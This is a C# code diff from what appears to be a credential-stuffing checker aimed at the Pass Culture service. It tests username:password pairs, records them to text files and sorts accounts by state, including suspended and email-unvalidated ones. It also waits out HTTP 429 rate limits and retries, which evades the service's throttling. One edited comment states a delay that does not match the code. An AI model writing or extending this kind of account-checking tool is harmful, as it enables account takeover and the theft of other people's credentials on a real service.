@@ -86,6 +86,15 @@ namespace DataVortex
                             // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
                             using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
                                 sw.WriteLine($"{username}:{password}");
+                            MarkAccountAsVerified(username, password);
+                        }
+                        if (accountState == "SUSPENDED")
+                        {
+
+                            // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
+                            using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
+                                sw.WriteLine($"{username}:{password}");
+                            MarkAccountAsVerified(username, password);
                         }
                     }
                     if (jsonResponse.ContainsKey("code") && jsonResponse["code"].ToString() == "EMAIL_NOT_VALIDATED")
@@ -95,6 +104,7 @@ namespace DataVortex
                         {
                             sw.WriteLine($"{username}:{password}");
                             Console.WriteLine("L'email n'a pas été validé. Ajout dans la liste incorrect.");
+                            MarkAccountAsVerified(username, password);
                         }
 
                         // Vous pouvez également gérer d'autres informations spécifiques à "EMAIL_NOT_VALIDATED" ici
@@ -201,7 +211,7 @@ namespace DataVortex
                         Console.ForegroundColor = ConsoleColor.Red;
                         Console.WriteLine("Erreur 429 : Rate limit atteint. Prochaine tentative dans 2 minute.");
                         Console.ResetColor();
-                        Thread.Sleep(120000); // Attendez 2 minute (120 000 millisecondes) avant de réessayer.
+                        Thread.Sleep(240000); // Attendez 4 minute (120 000 millisecondes) avant de réessayer.
                         await CheckPassCultureAsync(username, password); // Réessayez après l'attente.
                     }
                 }
